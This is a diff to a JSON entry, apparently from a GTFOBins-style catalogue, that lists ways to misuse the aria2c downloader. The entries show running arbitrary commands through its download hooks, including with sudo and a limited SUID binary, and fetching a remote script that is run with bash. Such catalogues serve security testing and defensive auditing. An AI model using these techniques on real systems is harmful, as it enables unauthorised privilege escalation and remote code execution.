@@ -3,21 +3,21 @@
   "functions": {
     "command": [
       {
-        "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\naria2c --on-download-error=$TF http://x\n"
+        "code": "TF=$(mktemp)\necho \"[command]\" > $TF\nchmod +x $TF\naria2c --on-download-error=$TF http://x\n"
       },
       {
         "description": "The remote file 'aaaaaaaaaaaaaaaa' (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. '--allow-overwrite' is needed if this is executed multiple times with the same GID.",
         "code": "aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash [host]/aaaaaaaaaaaaaaaa"
       }
     ],
-    "suid": [
-      {
-        "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x\n"
-      }
-    ],
     "sudo": [
       {
-        "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n"
+        "code": "TF=$(mktemp)\necho \"[command]\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "TF=$(mktemp)\necho \"[command]\" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x\n"
       }
     ]
   }
